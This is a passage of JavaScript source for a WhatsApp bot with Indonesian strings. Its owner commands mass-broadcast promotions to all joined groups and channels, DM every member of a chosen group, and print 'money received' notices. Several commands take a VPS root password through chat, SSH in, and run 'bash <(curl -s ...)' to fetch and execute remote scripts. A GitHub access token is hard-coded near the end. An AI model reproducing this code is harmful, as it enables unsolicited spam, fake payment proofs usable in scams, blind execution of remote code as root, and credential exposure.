    await m.reply(`Memproses *${command}* Share Ke ${res.length} Group`);

    for (let i of res) {
        if (
            global.db.groups[i] &&
            global.db.groups[i].blacklistjpm &&
            global.db.groups[i].blacklistjpm === true
        ) {
            continue;
        }

        try {
            await conn.sendMessage(
                i,
                {
                    image: fs.readFileSync(gambarDefault),
                    caption: teks,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namaSaluran,
                            newsletterJid: global.idSaluran,
                        },
                    },
                },
                { quoted: qlocJpm }
            );
            count++;
            suksesGrup.push(allgrup[i].subject); // Menambahkan nama grup yang berhasil terkirim
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${i}:`, err);
            gagalGrup.push(allgrup[i]?.subject || `Grup ID: ${i}`); // Menambahkan nama grup yang gagal
        }

        await sleep(global.delayJpm);
    }

    // Membuat daftar grup yang berhasil dan gagal dengan nomor berturutan
    const daftarSukses = suksesGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");
    const daftarGagal = gagalGrup
        .map((grup, index) => `${index + 1}. ${grup}`)
        .join("\n");

    // Mengirimkan pesan ke pengguna dengan daftar grup yang berhasil dan gagal
    await conn.sendMessage(
        jid,
        {
            text: `*${command} Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}\n\n*Grup yang berhasil:*\n${daftarSukses}\n\n*Grup yang gagal:*\n${daftarGagal}`,
        },
        { quoted: qlocJpm }
    );

    // Mengirim pesan ke owner jika ada error
    if (gagalGrup.length > 0) {
        await conn.sendMessage(
            `${global.owner}@s.whatsapp.net`,
            {
                text: `*Laporan Error*\nCommand: ${command}\nTerdapat ${gagalGrup.length} grup yang gagal dikirim pesan.\n\n*Daftar Grup Gagal:*\n${daftarGagal}`,
            }
        );
    }
}
break
case 'jpmch3': {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply("Format: Jpmallch jumlah_pesan|waktu|teks");
  const [jumlahPesan, waktu, ...teksArray] = text.split("|");
  const teks = teksArray.join("|").trim();
  const filePath = './library/database/idsaluran.json';
  let daftarSaluran = [];
  try {
    daftarSaluran = require(filePath);
  } catch (error) {
    console.error(`Gagal membaca file ${filePath}:`, error);
    return m.reply(`Gagal membaca file ${filePath}. Pastikan file ada dan dapat dibaca.`);
  }
  if (!jumlahPesan || isNaN(jumlahPesan) || !waktu || isNaN(waktu) || !teks) {
    return m.reply("Format salah! Gunakan: Jpmallch jumlah_pesan|waktu|teks");
  }
  const jumlah = parseInt(jumlahPesan);
  const interval = parseInt(waktu) * 60 * 1000;
  reply(`*Mengirim ${jumlah} pesan setiap ${waktu} menit ke daftar saluran...*`);
  let counter = 0;
  const pengirimanPesan = setInterval(async () => {
    if (counter >= jumlah) {
      clearInterval(pengirimanPesan);
      return m.reply("*Jpm Ch Telah Selesai ✅️*");
    }
    for (const idSaluran of daftarSaluran) {
      try {
        await conn.sendMessage(idSaluran, { text: teks });
      } catch (error) {
        console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
      }
    }
    counter++;
  }, interval);
}
break;

case "jpmchfoto": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply("Balas/kirim foto dengan teks");
  if (!/image/.test(mime)) return m.reply("Format salah! Balas/kirim foto dengan teks.");

  let image = await conn.downloadAndSaveMediaMessage(qmsg);
  const filePath = './library/database/idsaluran.json'; // path file JSON
  const daftarSaluran = require(filePath); // load file JSON

  let total = 0;
  m.reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        image: await fs.readFileSync(image),
        caption: text,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true
        }
      });
      total++;
    } catch (err) {
      console.error(`Gagal mengirim ke saluran ${idSaluran}:`, err);
    }
    await sleep(global.delayJpm); // Delay antara pesan
  }

  await fs.unlinkSync(image);
  m.reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'installdepend': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install Depend silakan ketik .installnebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cekpanel': {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${domainV2}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikeyV2}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${domainV2}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${capikeyV2}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '🟢 Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await conn.sendMessage(m.chat, {image: {url: "https://i.postimg.cc/wvH7FBgQ/Warungerik.jpg" }, caption: message }, {quoted: qtext})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break

case 'installtemanebula': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemaelyisum": case 'installtemaelysium': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'uninstalladdon': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* addon pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`9\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpm3': {
    if (!isCreator) return m.reply(mess.owner);
    if (!q) return m.reply(example("*teks dengan mengirim video*"));
    if (!/video/.test(mime)) return m.reply(example("teks dengan mengirim video"));
    
    const allgrup = await conn.groupFetchAllParticipating();
    const res = await Object.keys(allgrup);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const rest = await conn.downloadAndSaveMediaMessage(qmsg);
    
    await m.reply(`*Memproses jpm teks & video ke ${res.length} grup*`);
    
    for (let i of res) {
        // Lewati grup yang ada dalam daftar blacklist
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
        try {
            // Kirim video dengan caption
            await conn.sendMessage(i, { video: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm });
            count += 1;
        } catch {}
        await sleep(global.delayJpm); // Beri jeda pengiriman antar grup
    }
    
    await fs.unlinkSync(rest); // Hapus file sementara setelah selesai
    await conn.sendMessage(jid, { text: `*JPM Sukses dikirim*\n*Total grup yang berhasil dikirim pesan : ${count}*` }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'push-vbutton': {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesan|teksdibutton"))
if (!text.split("|")) return m.reply(example("idgrup|pesan|teksdibutton"))
const [idgc, pes, peszie] = text.split("|")
const teks = pes
const tekszie = peszie
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'

let imgscs = await prepareWAMessageMedia({ image: fs.readFileSync("./source/media/fake.jpg") }, { upload: conn.waUploadToServer })

const msgii = await generateWAMessageFromContent(mem, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: teks
}), 

contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `Nanz𝗻𝗵𝗼𝘀𝘁𝗶𝗻𝗴 [ 𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 ]`, newsletterJid: global.idSaluran }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender]
}, 

carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: tekszie, 
hasMediaAttachment: true,
...imgscs
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson:
`{
  title": "List Produk By Nanzhosting",
  "sections": [
    {
      "title": "Klik Salah Satu Produk untuk Mememesan !",
      "rows": [
        {
          "header": "𝗝𝗮𝘀𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹 ",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 𝗧𝗵𝗲𝗺𝗮 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗔𝗱𝗱 𝗙𝗶𝘁𝘂𝗿 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁𝘇",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗙𝗶𝘅𝘅 𝗘𝗿𝗿𝗼𝗿 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁𝘇",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗥𝗲𝗻𝗮𝗺𝗲 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁𝘇",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗩𝗶𝗿𝘁𝘂𝗮𝗹 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗦𝗲𝗿𝘃𝗲𝗿",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗣𝗮𝗿𝘁𝗵𝗻𝗲𝗿 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
         "header": "𝗢𝘄𝗻𝗲𝗿 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗡𝗼𝗸𝗼𝘀 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 ",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗟𝗶𝗻𝗲𝗲 𝗠𝗗",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁𝘇 𝗩𝟯",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁𝘇 𝗩𝟰 𝗕𝘂𝘁𝘁𝗼𝗻",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁𝘇 𝗩𝟰",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        }
]}
]}`
},
{
name: "quick_reply",
buttonParamsJson: `{\"display_text\":\"Done Save\",\"id\":\".donesave\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/62882022066260?text=.buysco\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: null})
await conn.relayMessage(mem, msgii.message, {messageId: msgii.key.id})
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: qtext})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'donesave': {
const donesaveee = `
*===> Response Done Save 々 IjulTaka || 乂 <====*
`

let imgscs = await prepareWAMessageMedia({ image: fs.readFileSync("./source/media/fake.jpg") }, { upload: conn.waUploadToServer })

const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `
*===> Response Done Save 々 IjulTaka || 乂 <====*
`
}), 

contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `Nanz𝗻𝗵𝗼𝘀𝘁𝗶𝗻𝗴 [ 𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 ]`, newsletterJid: global.idSaluran }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender]
}, 

carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: ``, 
hasMediaAttachment: true,
...imgscs
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson:
`{
  "title": "LIST PRODUK 々 IjulTaka || 乂",
  "sections": [
    {
      "title": "Klik Salah Satu Produk untuk Mememesan !",
      "rows": [
        {
          "header": "𝗝𝗮𝘀𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹 ",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 𝗧𝗵𝗲𝗺𝗮 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗔𝗱𝗱 𝗙𝗶𝘁𝘂𝗿 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁𝘇",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗙𝗶𝘅𝘅 𝗘𝗿𝗿𝗼𝗿 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁𝘇",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗝𝗮𝘀𝗮 𝗥𝗲𝗻𝗮𝗺𝗲 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁𝘇",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗩𝗶𝗿𝘁𝘂𝗮𝗹 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗦𝗲𝗿𝘃𝗲𝗿",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗣𝗮𝗿𝘁𝗵𝗻𝗲𝗿 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
         "header": "𝗢𝘄𝗻𝗲𝗿 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗡𝗼𝗸𝗼𝘀 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 ",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗟𝗶𝗻𝗲𝗲 𝗠𝗗",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁𝘇 𝗩𝟯",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁𝘇 𝗩𝟰 𝗕𝘂𝘁𝘁𝗼𝗻",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        },
        {
          "header": "𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁𝘇 𝗩𝟰",
          "title": "© Nanz𝗵𝗼𝘀𝘁𝗶𝗻𝗴",
          "description": "",
          "id": ""
        }
]}
]}
]}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"https://wa.me/62882022066260?text=.buysco\",\"merchant_url\":\"https://www.google.com\"}`
}
]
})
}]
})
})}
}}, {quoted: qtext})
await conn.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pushkontaklist': {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
global.temptext = text
const grup = await conn.groupFetchAllParticipating()
const obj = await Object.values(grup)
var section = []
for (let res of obj) {
await section.push({ title: `${res.subject}`, description: `Total Member : ${res.participants.length} Member`, id: `.respon_pushkontak ${res.id}` })
}
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\n  Pilih Target Grup Pushkontak'
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: \"- Total Grup Chat : ${obj.length} Grup\",
rows: ${JSON.stringify(section)}
}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await conn.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "suk": case "danamasuk": case "masukwait": {
    if (!isCreator) return reply(mess.owner);
    if (!q) return reply(example(`Contoh: ${prefix+command} [nominal] | [keterangan]`));

    // Memisahkan input nominal dan keterangan
    const [nominal, ...details] = q.split("|");
    if (!nominal || details.length === 0) return reply(`Format salah! Gunakan: ${prefix+command} [nominal] | [keterangan]`);

    let teks = `💵 *Dana Masuk*
─────────────────────
💲 *Nominal:* Rp${nominal.replace(/\B(?=(\d{3})+(?!\d))/g, ".")}
📝 *Keterangan:* ${details.join(" ")}
⏰ *Waktu:* ${jam}
🕡 *Tanggal:* ${penghitung}

© Rapszio333
─────────────────────`;

    await rapzio.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `Dana Masuk Rp${nominal.replace(/\B(?=(\d{3})+(?!\d))/g, ".")} ✅`,
                body: `© Powered By ${namaOwner}`,
                thumbnailUrl: global.image.reply,
                sourceUrl: linkSaluran,
            }
        }
    }, {quoted: qtoko});
}
break

case 'adddb2': {
if (!isCreator) return m.reply('Khusus Owner Script')
 if (!q) return m.reply('❌ Anda harus mengirimkan data dalam format: nomor|nama|password.');

 const [phoneNumber, name, password] = q.split('|').map(item => item.trim()); // Pisahkan input berdasarkan '|'

 if (!phoneNumber || !name || !password) {
 return m.reply('❌ Format tidak valid. Gunakan format: nomor|nama|password.');
 }

 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'ZatromHub'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'DataBase-'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'datauser.json'; // Path ke file JSON di repositori Anda

 try {
 // Ambil data JSON dari GitHub
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
